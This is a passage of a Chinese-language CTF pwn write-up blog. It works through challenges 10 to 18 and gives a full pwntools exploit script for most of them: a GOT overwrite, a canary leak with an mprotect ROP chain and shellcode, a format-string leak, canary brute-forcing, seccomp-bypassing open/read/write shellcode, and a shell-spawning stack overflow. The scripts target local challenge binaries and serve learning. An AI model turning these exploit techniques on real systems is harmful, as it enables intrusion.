class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="10-这是什么？got"><a href="#10-这是什么？got" class="headerlink" title="10 这是什么？got"></a>10 这是什么？got</h4><p>直接允许往got表里填东西，从前往后填，把exit的got跳转到后门函数，但是会把system的got表里填的东西破坏，本来想着绕过，结果read没啥可绕的，那就看看在绑定前是什么。</p><p>好，plt+6的固定地址，保护好system的got表即可</p><p><img src="C:/Users/czy/AppData/Roaming/Typora/typora-user-images/image-20240919215159756.png" alt="image-20240919215159756"></p><p>exp：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pregot&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,37689)</span><br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>back_addr = <span class="hljs-number">0x401196</span><br>main_addr = <span class="hljs-number">0x401217</span><br>system_plt_6 = <span class="hljs-number">0x401056</span><br>payload = p64(system_plt_6)*<span class="hljs-number">7</span> + p64(back_addr)<br>debug()<br>sd(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="11-nx-on"><a href="#11-nx-on" class="headerlink" title="11 nx-on"></a>11 nx-on</h4><p>静态编译，有mportect，mprotect开权限后打shellcode就行。</p><p>有cananry，把canary绕过后，栈溢出mprotect开权限，然后打shellcode</p><p>本来想用用ropchain，结果太长了，不给偷懒的机会。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409192208848.png" alt="image-20240919220816806"></p><p>unsigned int 可以有整数溢出，不过-1太大了，后面复制会崩。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409192207952.png" alt="image-20240919220646278"></p><p>注意别忘了mprotrct调用，别忘了要整数页对齐。三参分别为地址、长度、权限。</p><p>exp:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./nx_on&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">34105</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>mprotect_addr = <span class="hljs-number">0x450B90</span><br>pop_rdi = <span class="hljs-number">0x000000000040239f</span><br>pop_rsi = <span class="hljs-number">0x000000000040a40e</span><br>pop_rdx_rbx = <span class="hljs-number">0x000000000049d12b</span><br>bss_addr = <span class="hljs-number">0x4E5B60</span><br><br>ru(<span class="hljs-string">&#x27;id&#x27;</span>)<br>sd(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+b<span class="hljs-string">&#x27;b&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;ab&#x27;</span>)<br>canary = b<span class="hljs-string">&#x27;\x00&#x27;</span><br>canary += p.recv(<span class="hljs-number">7</span>)<br>canary = u64(canary)<br>print(hex(canary))<br>payload = b<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x18</span> + p64(canary) * <span class="hljs-number">2</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x4e5000</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0x2000</span>) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">7</span>) * <span class="hljs-number">2</span> + p64(mprotect_addr) + p64(bss_addr + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x8</span> * <span class="hljs-number">11</span>) + asm(shellcraft.sh()) <br>sd(payload)<br>ru(<span class="hljs-string">&#x27;size&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>sl(b<span class="hljs-string">&#x27;-1111&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="12-这是什么，32-bit？"><a href="#12-这是什么，32-bit？" class="headerlink" title="12 这是什么，32-bit？"></a>12 这是什么，32-bit？</h4><p>scanf看着怪怪的，其实就以回车截止，没啥用。</p><p>gituid，当root权限时，返回0；普通用户为1，改不了，直接栈溢出去跳backdoor</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201039522.png" alt="image-20240920103914363"></p><p>backdoor这里改一改函数的参数<br><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201042234.png" alt="image-20240920104233186"></p><p>execve(‘&#x2F;bin&#x2F;sh’,0,0)，注意bin_sh的传参时只想bin_sh字符串的地址，不能是间接的。</p><p>本来想试试直接用execve来cat flag，结果没有能对应的字符串，连fake_flag也读不出来。。。我就要看看fake</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201119431.png" alt="image-20240920111929396"></p><p>exp：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./backdoor&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">45815</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>backdoor_addr = <span class="hljs-number">0x80491D6</span><br>execve_addr = <span class="hljs-number">0x8049212</span><br>bin_sh  = <span class="hljs-number">0x804A011</span><br><span class="hljs-comment">#bin_sh = 0x804C030</span><br>bin_cat = <span class="hljs-number">0x804A008</span><br>flag_str = <span class="hljs-number">0x804A021</span><br>sd(b<span class="hljs-string">&#x27;\n&#x27;</span>)<br>payload = b<span class="hljs-string">&quot;A&quot;</span> * (<span class="hljs-number">0x28</span> + <span class="hljs-number">4</span>) + p32(execve_addr) + p32(bin_sh) + p32(<span class="hljs-number">0</span>) +p32(<span class="hljs-number">0</span>) <br><span class="hljs-comment">#payload = b&quot;A&quot;*(0x28+4) + p32(execve_addr) + p32(bin_cat) + p32(flag_str) + p32(0)</span><br><span class="hljs-comment">#debug()</span><br>sl(payload)<br><br><br>p.interactive()<br>           <br></code></pre></td></tr></table></figure><h4 id="13-moeplane"><a href="#13-moeplane" class="headerlink" title="13 moeplane"></a>13 moeplane</h4><p>给了个关于航班的结构体，提示负数溢出，试了好久，没头绪，不会</p><h4 id="14-Loginsystem"><a href="#14-Loginsystem" class="headerlink" title="14 Loginsystem"></a>14 Loginsystem</h4><p>主函数格式化字符串打印泄露bss段上存的password即可。（不过不知道为什么给了so文件，哦，不同系统对应的偏移可能不同。懒得换了，大不了一点点往下测，不过恰好与本机一样了）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201720224.png" alt="image-20240920172054140"></p><p>password是个获取的随机数</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201720040.png" alt="image-20240920172003963"></p><p>exp:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./loginsystem&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">43911</span>)<br>sl = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.sendline(s)<br>sd = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.send(s)<br>rc = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recv(s)<br>ru = <span class="hljs-built_in">lambda</span> s <span class="hljs-symbol">:p</span>.recvuntil(s)<br>rl = <span class="hljs-built_in">lambda</span>   <span class="hljs-symbol">:p</span>.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>password = <span class="hljs-number">0x404050</span><br><br>payload = b<span class="hljs-string">&quot;%9$sabcd&quot;</span>+p64(password)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br><br>strs = rl()<br>strs = rl()<br>strs = u64(rl()[<span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span>])<br>print(hex(strs))<br><br>payload = p64(strs)<br>sd(payload)<br><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="15-Catch-the-canary"><a href="#15-Catch-the-canary" class="headerlink" title="15 Catch_the_canary!"></a>15 Catch_the_canary!</h4><p>第一步有个password的随机数猜测，搜了搜arc4random,每运行就会生成一次，找不到破绽（刚开始以为让scanf返回为-1就得了，其实不对，而且花了好久的时间找怎么让它-1也每找到，顶多不输入是0）最后：有while，重复输入判断，有固定值加取余，直接爆破不就得了。。。我真的。。。。。被自己蠢到了，浪费了好多时间。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409201954424.png" alt="image-20240920195423277"></p><p>下面这段函数应该执行3次，但是我的循环终止条件写错了，导致调了半天。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202026591.png" alt="image-20240920202629535"></p><p>这个循环的第一次输入变成了循环的一次输入，循环多跑了一次。。</p><p>原本以为循环终止条件写错了，怎么调都调不出来毛病，感觉对的呀，最终的问题：上面少接收了一行输出，导致下一轮才接收到正确的结果。。。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202038547.png" alt="image-20240920203823504"></p><p>提示的scanf+-来跳过输入，很常见了，白费了提示。</p><p>剩下就是常规的puts泄露canary，栈溢出到后门</p><p><del>良心玩家，不用打libc</del></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./mycanary&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">45565</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>back_addr = <span class="hljs-number">0x4012AD</span><br><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#sl(&#x27;32767&#x27;)</span><br>rl()<br>rl()<br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4014BA&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">9029</span>):<br>        <br>    password = <span class="hljs-number">16768186</span>+i<br>    sl(<span class="hljs-built_in">str</span>(password))<br>    strs=rl()<br>    <span class="hljs-built_in">print</span>(strs)<br>    <span class="hljs-keyword">if</span> strs == <span class="hljs-string">b&#x27;[Info] Cage opened.\n&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4014BA&#x27;)</span><br><br>sl(<span class="hljs-string">b&#x27;+&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;+&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;195874819&#x27;</span>)<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;B&#x27;</span><br>sd(payload)<br>ru(<span class="hljs-string">&#x27;AB&#x27;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br>canary +=rc(<span class="hljs-number">7</span>)<br>canary = u64(canary)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x18</span>) + p64(canary)*<span class="hljs-number">2</span> + p64(back_addr)<br><span class="hljs-comment">#debug()</span><br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="16-shellcode-revenge"><a href="#16-shellcode-revenge" class="headerlink" title="16 shellcode_revenge"></a>16 <strong>shellcode_revenge</strong></h4><p>沙箱禁了execve</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202114002.png" alt="image-20240920211345249"></p><p>一个小菜单，管理员登录，用户登录（这里没检查负数溢出，但是没有用），用户注册（没用），自行输入shellcode并执行，有用。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202322159.png" alt="image-20240920232046998"></p><p>密码是时间戳的伪随机数，直接上公式，登陆后level&#x3D;1，才能用operate执行shellcode</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202322455.png"></p><p>执行输入的shellcode。这里注意写shellcode时，不要随便用寄存器赋值来修改，因为环境变量可能不同！！！！</p><p>重温shellcraft的调用</p><p>只能读13字节，本来想分次orw，结果不够，那就shellcode执行read，再写orw，原本打算往这个已知地址的地方写，这会导致需要找地方写入（第一次加的地址太多了，写到了没有分配空间的地方），前面需要填nop来滑栈。但是往栈里写就好了（不用考虑是否存在这个空间。）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409202323352.png" alt="image-20240920232339267"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./shellcode_revenge&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,41169)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br><br>dll=cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>seed =time.time()<br>a=<span class="hljs-built_in">int</span>(seed)<br>dll.srand(a)<br>admin_pwd = dll.rand()<br><br>rl()<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(admin_pwd))<br>rl()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">sl(b&#x27;3&#x27;)</span><br><span class="hljs-string">rl()</span><br><span class="hljs-string">sl(b&#x27;0&#x27;)</span><br><span class="hljs-string">rl()</span><br><span class="hljs-string">sd(&#x27;xyyr&#x27;)</span><br><span class="hljs-string">debug()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#ru(&#x27;Choose&#x27;)</span><br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edx,0x100</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>code = asm(code).ljust(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(code))<br><span class="hljs-comment">#debug()</span><br>sd(code)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;</span><br>shellcode += shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>shellcode += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>code =<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">16</span>+ asm(shellcode)<br>sd(code)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">code = shellcraft.open(&quot;.&quot;)</span><br><span class="hljs-string">code += shellcraft.getdents(&#x27;eax&#x27;,&#x27;rsp&#x27;, 4096)</span><br><span class="hljs-string">code += shellcraft.write(1,&#x27;rsp&#x27;,4096)</span><br><span class="hljs-string">shellcode = b&#x27;\x90&#x27;*16+asm(code)</span><br><span class="hljs-string">sd(shellcode)</span><br><span class="hljs-string"></span><br><span class="hljs-string">all = p.recv(4096)</span><br><span class="hljs-string">index = all.find(&#x27;flag&#x27;)</span><br><span class="hljs-string">flagname = all[index:index+9]</span><br><span class="hljs-string">success(flagname)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="17-pwn-it-off"><a href="#17-pwn-it-off" class="headerlink" title="17 pwn_it_off"></a>17 pwn_it_off</h4><p>本函数要填入之间随机数生成的密码，由于是固定的距离rbp的距离，所以产生的密码的位置是一致的，gdb动调找到对应的行。白色的部分即为密码，也就是第二次输出的对应位置，接收后发送即可。这里其实是最后一次生成的这个位置，也就是最后一次发送的密码的白色位置。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211535725.png" alt="image-20240921153551600"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211534543.png" alt="image-20240921153455446"></p><p>第二层还是老样子，最后一次输出的这个位置</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211556221.png" alt="image-20240921155637175"></p><p>后几位是这个数，但是前面的位在这里无法输入，需要在第一次输入进去，发现能覆盖到v1[1],只要把v1[0]与v1[1]输成一样的就行。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211608118.png" alt="image-20240921160806072"></p><p>这么覆写后发现，对数大小的检测过不去了</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211630431.png" alt="image-20240921163037367"></p><p>有了，该死的要用产生的密码的提示。。。。。。。。。</p><p>我直接覆盖成定值，输入定值不久得了。。。</p><p>总是输入不进去，才发现这里给read的超了1个字节，只有0x17来着</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409211642908.png" alt="image-20240921164253872"></p><p>改成p32后覆盖不全，再多加一个\x00就成了。</p><p>至于为什么选第三次作为最后一次–》第三次随机出来的情况最多，而且方便。至于哪儿方便了—-试试就知道了。</p><p>exp：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br>p=process(&#x27;./alarm&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=remote(&#x27;127.0.0.1&#x27;,)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br><br>space1 = p.recv(0x3f)<br>space1 = p.recv(0x3f)<br>print(b&quot;this is +++ &quot;+ space1)<br>space2 = rc(0x18+4)<br>print(b&#x27;this is --- &#x27;+ space2)<br>pwd1 = rc(15)<br>print(b&#x27;the pwd is&#x27;+pwd1)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">sd</span><span class="hljs-params">(&#x27;\<span class="hljs-variable">n</span>&#x27;)</span><br>pwd1 +=b&#x27;\x00&#x27;<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">sd</span><span class="hljs-params">(<span class="hljs-variable">pwd1</span>)</span><br>rc(2)<br>pwd2 = rc(1)<br>print(b&#x27;the pwd2 is &#x27;)<br>print(pwd2)<br>pwd = pwd1 + p32(0x2710)+b&#x27;\x00&#x27;<br>sd(pwd)<br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">gdb</span>.attach(p,&#x27;b *main+43&#x27;)<br><br>ru(b&#x27;Input the numeric password&#x27;)<br>sl(b&#x27;10000&#x27;)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="18-return15"><a href="#18-return15" class="headerlink" title="18 return15"></a>18 return15</h4><p>栈溢出+srop，bin_sh地址都给了，忘截图了，很简单，有手就行。</p><p>exp:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 